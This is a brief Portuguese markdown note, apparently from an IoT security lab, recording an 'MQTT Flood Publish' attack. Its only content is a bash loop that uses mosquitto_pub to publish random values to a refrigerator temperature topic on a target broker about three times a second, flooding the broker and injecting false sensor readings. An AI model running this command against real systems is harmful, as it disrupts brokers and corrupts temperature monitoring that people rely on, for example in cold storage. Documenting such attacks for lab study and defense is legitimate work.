# Ataque MQTT Flood Publish

Comando utilizado:

```bash
while true; do 
  mosquitto_pub -h <IP do alvo> \
    -t frigorifico/fisico/temperatura \
    -m $((RANDOM % 200))
  sleep 0.333
done
